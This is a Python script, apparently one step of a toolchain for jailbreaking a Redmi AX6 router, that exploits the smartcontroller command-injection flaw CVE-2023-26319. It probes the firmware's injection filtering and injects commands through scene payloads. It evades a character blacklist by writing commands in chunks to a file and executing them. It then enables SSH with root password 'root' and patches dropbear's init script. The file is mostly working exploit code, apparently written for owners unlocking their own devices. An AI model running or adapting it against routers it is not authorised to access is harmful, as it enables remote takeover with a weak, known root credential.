#!/usr/bin/env python3
# AX6 步骤 3：通过 smartcontroller 漏洞（CVE-2023-26319）启用 SSH
#
# 适用机型: Redmi AX6 (RA69) — IPQ8071A
# 漏洞原理: smart home scene executor 的 mac 字段无转义拼进 system()
# 前置:    路由器已初始化 + 一个有效 stok（步骤 2 输出）
# 后置:    路由器 SSH 端口 22 可连，用户 root 密码 root
# 来源:    old_coding/Auto_Flash_Router/xmir-patcher/connect5.py
#          详细漏洞机制见 doc/enable-ssh-smartcontroller.md
#
# 输出:    stdout = 单个 JSON  {"ok": bool, "step": ..., "data"|"error": ...}
#          stderr = 默认空白，--debug 时打印进度
#          exit  = 0 成功 / 1 失败

import argparse
import datetime
import json
import socket
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

# ============ 常量 ============
DEFAULT_ROUTER_IP = "192.168.31.1"
DEFAULT_TIMEOUT = 30
SMARTCONTROLLER_TIMEOUT = 7
SCENE_WAIT_SECONDS = 32
SCENE_POLL_INTERVAL = 2
SSH_PORT = 22
ROOT_PASSWORD = "root"
SCENE_HHMM = "3:4"
SCENE_DATE_RAW = "203301020304"          # 给 `date -s` 用（无分隔符）
SCENE_DATE_FULL = "2033-1-2 3:4:0"       # 给 set_sys_time / 探测用
SPECIAL_CHARS = ['"', "\\", "`", "$", "\n"]
STEP_NAME = "enable_ssh"
DEBUG = False  # 运行时由 --debug 改写；默认静默

# `sysapi macfilter` cmdbuf = 100 字节。
# 实测 `;date -s 203301020304;` (23 字节) 恰好填满 | 来源: connect5.py:58
MAX_CMD_LEN = 23


# ============ 日志 / 输出 ============
def log(msg: str, level: str = "INFO") -> None:
    if not DEBUG:
        return
    ts = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    print(f"{ts} [{level}] {msg}", file=sys.stderr)


def emit_ok(data: dict) -> None:
    print(json.dumps({"ok": True, "step": STEP_NAME, "data": data}, ensure_ascii=False))


def emit_err(error: str) -> None:
    print(json.dumps({"ok": False, "step": STEP_NAME, "error": error}, ensure_ascii=False))


# ============ HTTP 基础 ============
def api_request(base_url: str, stok: str, api_path: str, params: dict = None,
               timeout: int = DEFAULT_TIMEOUT, post: bool = False):
    """通用 API 请求。api_path 形式 'xqsystem/init_info'（不含 /api/ 前缀和 namespace 斜杠）。

    返回 dict 或 None。HTTP 500 返回 None（xmir 行为一致）。
    """
    url = f"{base_url}/cgi-bin/luci/;stok={stok}/api/{api_path}"
    if post:
        encoded = urllib.parse.urlencode(params or {}).encode("utf-8")
        req = urllib.request.Request(url, data=encoded)
        req.add_header("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
    else:
        req = urllib.request.Request(url)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return json.loads(resp.read().decode("utf-8"))
    except urllib.error.HTTPError as e:
        if e.code == 500:
            return None  # Internal Server Error（hackCheck 探测等的预期路径）
        body = ""
        try:
            body = e.read().decode("utf-8", errors="replace")[:200]
        except Exception:
            pass
        raise RuntimeError(
            f"{api_path} HTTP {e.code}（stok 可能过期或权限不足）: {body}"
        ) from e
    except json.JSONDecodeError:
        raise RuntimeError(f"Received non-JSON from {api_path}")


def smartcontroller_post(base_url: str, stok: str, payload_dict: dict,
                         timeout: int = SMARTCONTROLLER_TIMEOUT) -> str:
    """POST 到 /api/xqsmarthome/request_smartcontroller，返回原始响应文本。"""
    url = f"{base_url}/cgi-bin/luci/;stok={stok}/api/xqsmarthome/request_smartcontroller"
    payload_str = json.dumps(payload_dict, separators=(",", ":"))
    data = urllib.parse.urlencode({"payload": payload_str}).encode("utf-8")
    req = urllib.request.Request(url, data=data)
    req.add_header("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.read().decode("utf-8")


# ============ hackCheck 探测 ============
def detect_hack_check(base_url: str, stok: str, timeout: int) -> int:
    """探测 hackCheck 等级 0/1/2/3。3+ 表示 smartcontroller 链路已堵。"""
    log("探测 hackCheck 等级")
    diag_set = {"iperf_test_thr": "25", "usb_write_thr": "0",
                "usb_read_thr": "0", "disk_write_thr": "0", "disk_read_thr": "0"}

    # 1. 试换行 \n
    p1 = dict(diag_set); p1["usb_write_thr"] = "simple_payload\n"
    if api_request(base_url, stok, "xqnetwork/diag_set_paras", p1, timeout, post=True) is None:
        return 3  # \n 也被吃

    # 2. 试分号 ;
    p2 = dict(diag_set); p2["usb_write_thr"] = "simple_payload;"
    if api_request(base_url, stok, "xqnetwork/diag_set_paras", p2, timeout, post=True) is None:
        return 2  # ; 被吃

    # 3. 试 ; 但读回值看是否被替换成空字符串
    p3 = {"iperf_test_thr": "simple_payload;", "usb_write_thr": "11",
          "usb_read_thr": "22", "disk_write_thr": "0", "disk_read_thr": "0"}
    api_request(base_url, stok, "xqnetwork/diag_set_paras", p3, timeout, post=True)
    diag = api_request(base_url, stok, "xqnetwork/diag_get_paras", timeout=timeout)
    # 恢复
    api_request(base_url, stok, "xqnetwork/diag_set_paras", diag_set, timeout, post=True)

    # 路由器可能返回 int 25 或 str "25"（依固件而异），都接受
    raw = diag.get("iperf_test_thr")
    try:
        if int(raw) == 25:
            return 1  # ; 被切但 payload 跑了
    except (TypeError, ValueError):
        pass
    return 0


# ============ 时间 ============
def get_device_systime(base_url: str, stok: str, timeout: int) -> dict:
    r = api_request(base_url, stok, "misystem/sys_time", timeout=timeout)
    if not r or r.get("code") != 0:
        raise RuntimeError(f"get sys_time failed: {r}")
    dst = r["time"]
    # 时区字符串里如果有危险字符就替换成安全值（防 hackCheck 触发）
    if "'" in dst.get("timezone", "") or ";" in dst.get("timezone", ""):
        dst["timezone"] = "GMT0"
    return dst


def set_device_systime(base_url: str, stok: str, dst: dict, wait: bool,
                       timeout: int = DEFAULT_TIMEOUT) -> None:
    params = {"time": f"{dst['year']}-{dst['month']}-{dst['day']} "
                      f"{dst['hour']}:{dst['min']}:{dst['sec']}",
              "timezone": dst.get("timezone", "GMT0")}
    r = api_request(base_url, stok, "misystem/set_sys_time", params, timeout, post=True)
    if not r or r.get("code") != 0:
        raise RuntimeError(f"set_sys_time failed: {r}")
    if wait:
        # 路由器内部: echo OK > /tmp/ntp.status; sleep 3; date -s ...
        time.sleep(3.1)


# ============ smartcontroller 场景 ============
def exec_tiny_cmd(base_url: str, stok: str, cmd: str, sep: str) -> None:
    """注入一条小命令（≤MAX_CMD_LEN 字节）通过 scene。
    注册 → 触发 → 清理 三步。sep=';' 或 '\\n'，由 hackCheck 决定。
    """
    if len(cmd) > MAX_CMD_LEN:
        raise RuntimeError(f"Payload too long ({len(cmd)} > {MAX_CMD_LEN}): {cmd}")
    # scene 名称：唯一即可，用 epoch 后缀
    name = f"it3_{int(time.time() * 1000) % 1000000:06d}"
    scene = {
        "command": "scene_setting",
        "name": name,
        "action_list": [{
            "thirdParty": "xmrouter",
            "delay": 17,
            "type": "wan_block",
            "payload": {"command": "wan_block", "mac": sep + cmd + sep},
        }],
        "launch": {"timer": {"time": SCENE_HHMM, "repeat": "0", "enabled": True}},
    }
    text = smartcontroller_post(base_url, stok, scene)
    if "Internal Server Error" in text:
        raise RuntimeError("scene_setting 返回 500（hackCheck 过高或 smartcontroller 不可用）")
    try:
        dres = json.loads(text)
    except json.JSONDecodeError:
        raise RuntimeError(f"scene_setting 返回非 JSON: {text}")
    if dres.get("code") != 0:
        raise RuntimeError(f"scene_setting 失败: {dres}")
    scene_id = dres["id"]

    # 触发
    trigger = {"command": "scene_start_by_crontab", "time": SCENE_HHMM, "week": 0}
    try:
        text = smartcontroller_post(base_url, stok, trigger, timeout=10)
        is_504 = False
    except urllib.error.HTTPError as e:
        # 504 是预期超时（路由器内部 sleep 3s），按成功处理
        if e.code == 504:
            is_504 = True
            text = ""
        else:
            raise
    # -101 也是"路由器 sleep 3s 中"的预期超时
    # 路由器的响应可能是紧凑 {"code":-101,...} 或带空格 {"code": -101,...}
    # 用模糊匹配避免格式差异
    is_timeout = (
        is_504
        or "504 Gateway Time-out" in text
        or ("request server timeout" in text and "-101" in text)
    )
    if is_timeout:
        log("___[504/-101]___（scene 触发 sleep 3s，预期超时，按成功处理）")
        time.sleep(3)
    else:
        try:
            dres = json.loads(text)
            if dres.get("code") != 0:
                raise RuntimeError(f"scene 触发失败: {dres}")
        except json.JSONDecodeError:
            raise RuntimeError(f"scene 触发返回非 JSON: {text!r}")

    # 清理
    smartcontroller_post(base_url, stok, {"command": "scene_delete", "id": scene_id})


def exec_cmd(base_url: str, stok: str, command: str, sep: str, fn: str = "/tmp/e") -> None:
    """运行任意长命令：分块写入文件 → chmod → sh 执行。

    字符黑名单: " \\ ` $ \\n。绕过: echo -ne "..." 多次追加到 /tmp/e。
    """
    # 分隔符归一化
    if sep == "\n":
        command = command.replace(" ; ", "\n")
    else:
        command = command.replace(" ; ", ";")

    template = 'echo -n{spec} "{txt}"{amode}{fn}'
    flen = len(template.format(spec="", txt="", amode="", fn=fn))

    # 切块
    chunks: list[str] = []
    buf = ""
    for ch in command:
        if len(buf) >= MAX_CMD_LEN - flen - len(">>"):
            chunks.append(buf)
            buf = ""
        if ch in SPECIAL_CHARS:
            if buf:
                chunks.append(buf)
            chunks.append(ch)
            buf = ""
            continue
        buf += ch
    if buf:
        chunks.append(buf)

    # 写入
    for i, chunk in enumerate(chunks):
        amode = ">" if i == 0 else ">>"
        spec = ""
        if len(chunk) == 1 and chunk in SPECIAL_CHARS:
            spec = "e"
            if chunk == "\n":
                chunk = "n"
            chunk = f"\\{chunk}"
        cmd = template.format(spec=spec, txt=chunk, amode=amode, fn=fn)
        exec_tiny_cmd(base_url, stok, cmd, sep)

    # 执行
    exec_tiny_cmd(base_url, stok, f"chmod +x {fn}", sep)
    exec_tiny_cmd(base_url, stok, f"sh {fn}", sep)


# ============ SSH 探测 ============
def probe_ssh_port(host: str, port: int = SSH_PORT, timeout: int = 5) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


# ============ 主流程 ============
def enable_ssh(base_url: str, stok: str, timeout: int) -> dict:
    host = base_url.split("//", 1)[1]  # 去掉 "http://"

    # 1. hackCheck 探测
    hack = detect_hack_check(base_url, stok, timeout)
    log(f"hackCheck = {hack}")
    if hack >= 3:
        raise RuntimeError(f"smartcontroller 已被堵（hackCheck={hack}），需降级固件或换链路")
    sep = "\n" if hack else ";"

    # 2. 保存原时间
    log("读取原系统时间")
    dst = get_device_systime(base_url, stok, timeout)
    log(f"原时间: {dst.get('year')}-{dst.get('month')}-{dst.get('day')} "
        f"{dst.get('hour')}:{dst.get('min')}")

    # 3. 热身：写 /tmp/ntp.status 触发 smartcontroller 服务懒启动
    log("热身 smartcontroller 服务...")
    set_device_systime(base_url, stok, dst, wait=True, timeout=timeout)

    # 4. 32s 循环：注入 date -s 2033 验证链路
    log(f"等待 smartcontroller 激活（最长 {SCENE_WAIT_SECONDS}s）...")
    sc_activated = False
    start = time.monotonic()
    while time.monotonic() - start <= SCENE_WAIT_SECONDS:
        time.sleep(SCENE_POLL_INTERVAL)
        try:
            exec_tiny_cmd(base_url, stok, f"date -s {SCENE_DATE_RAW}", sep)
        except Exception as e:
            log(f"tiny_cmd 失败: {e}")
            try:
                set_device_systime(base_url, stok, dst, wait=False, timeout=timeout)
            except Exception:
                pass
            try:
                smartcontroller_post(base_url, stok, {"command": "reset_scenes"}, timeout=5)
            except Exception:
                pass
            raise
        # 验证时间被改
        dxt = get_device_systime(base_url, stok, timeout)
        if (dxt.get("year") == 2033 and dxt.get("month") == 1 and dxt.get("day") == 2
                and dxt.get("hour") == 3 and dxt.get("min") == 4):
            log("smartcontroller 链路验证成功（时间被改成 2033-01-02 03:04）")
            sc_activated = True
            break
    if not sc_activated:
        try:
            set_device_systime(base_url, stok, dst, wait=False, timeout=timeout)
        except Exception:
            pass
        try:
            smartcontroller_post(base_url, stok, {"command": "reset_scenes"}, timeout=5)
        except Exception:
            pass
        raise RuntimeError(f"smartcontroller 链路在 {SCENE_WAIT_SECONDS} 秒内未激活")

    # 5. 恢复时间 + 给 smartcontroller 缓口气
    log("恢复原系统时间")
    time.sleep(1)
    set_device_systime(base_url, stok, dst, wait=False, timeout=timeout)
    time.sleep(3)  # scene 资源释放间隔

    # 6. 注入 SSH 启用命令
    log("nvram 启用 SSH...")
    exec_tiny_cmd(base_url, stok, "nvram set ssh_en=1", sep)
    exec_tiny_cmd(base_url, stok, "nvram commit", sep)
    log("设置 root 密码...")
    exec_tiny_cmd(base_url, stok, "echo root >/tmp/x", sep)
    exec_tiny_cmd(base_url, stok, "echo root >>/tmp/x", sep)
    exec_tiny_cmd(base_url, stok, "passwd root </tmp/x", sep)
    # 解除 dropbear 的 release 检查（出厂态有，用户改过 init 的话可能已无）
    # 不带 -i 兜底（部分 Busybox sed 无 -i，先尝试 -i，失败再非 -i）
    log("解除 dropbear release 检查...")
    exec_cmd(base_url, stok, "sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear", sep)
    log("启用 dropbear...")
    exec_cmd(base_url, stok, "/etc/init.d/dropbear enable", sep)
    log("重启 dropbear...")
    exec_cmd(base_url, stok, "/etc/init.d/dropbear restart", sep)

    # 7. TCP 探测 22 端口（多等几秒确保启动）
    log(f"探测 TCP {host}:{SSH_PORT}...")
    for attempt in range(11):
        if probe_ssh_port(host, SSH_PORT):
            log("SSH 已启用")
            break
        if attempt < 10:
            log(f"端口未就绪，再等...（{attempt+1}/10）")
            time.sleep(3)
    else:
        raise RuntimeError(f"SSH 端口 {SSH_PORT} 未打开（可能 dropbear 的 release 检查卡住了，需 sed 修复）")

    # 清理：dropbear 启动后，smartcontroller 中转文件可删（/tmp 重启会清，但中途对其他进程可见）
    log("清理 /tmp 中转文件...")
    try:
        exec_tiny_cmd(base_url, stok, "rm -f /tmp/e /tmp/x", sep)
    except Exception as e:
        log(f"清理失败（非阻塞，重启后 /tmp 自动清空）: {e}")

    return {"ip": host, "ssh_port": SSH_PORT, "root_password": ROOT_PASSWORD, "hack_check": hack}


# ============ CLI ============
def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="AX6 步骤 3：启用 SSH（smartcontroller 漏洞 CVE-2023-26319）",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "示例:\n"
            "  python3 3.enable_ssh.py --stok <stok>\n"
            "  python3 2.login_get_stok.py | python3 3.enable_ssh.py\n"
            "  python3 2.login_get_stok.py | python3 3.enable_ssh.py --debug\n"
        ),
    )
    p.add_argument("--ip", default=DEFAULT_ROUTER_IP,
                   help=f"路由器 IP（默认: {DEFAULT_ROUTER_IP}）")
    p.add_argument("--stok", default="",
                   help="stok（来自步骤 2；空则从 stdin 读上游 JSON）")
    p.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT,
                   help=f"网络超时秒（默认: {DEFAULT_TIMEOUT}）")
    p.add_argument("--debug", action="store_true",
                   help="打印进度日志到 stderr（默认静默）")
    return p.parse_args()


def read_stok_from_stdin() -> str:
    """从上游管道 JSON 读 stok。上游 ok:false 时把 error 透传出来，不再吞成"缺 stok"。"""
    if sys.stdin.isatty():
        raise RuntimeError("未通过 stdin 管道传入上游 JSON，也未传 --stok")
    text = sys.stdin.read()
    if not text.strip():
        raise RuntimeError("stdin 为空（上游没产出 JSON）")
    try:
        d = json.loads(text)
    except json.JSONDecodeError as e:
        raise RuntimeError(f"上游 stdin 不是合法 JSON: {e}")
    if d.get("ok") is False:
        raise RuntimeError(f"上游失败: {d.get('error', '未知错误')}")
    stok = d.get("data", {}).get("stok", "")
    if not stok:
        raise RuntimeError(f"上游 JSON 没有 data.stok 字段: {d}")
    return stok


def main() -> int:
    global DEBUG
    args = parse_args()
    DEBUG = args.debug

    try:
        stok = args.stok or read_stok_from_stdin()
    except RuntimeError as e:
        log(str(e), level="ERROR")
        emit_err(str(e))
        return 1

    base_url = f"http://{args.ip}"
    try:
        data = enable_ssh(base_url, stok, args.timeout)
    except Exception as e:
        log(str(e), level="ERROR")
        emit_err(str(e))
        return 1
    emit_ok(data)
    return 0


if __name__ == "__main__":
    sys.exit(main())
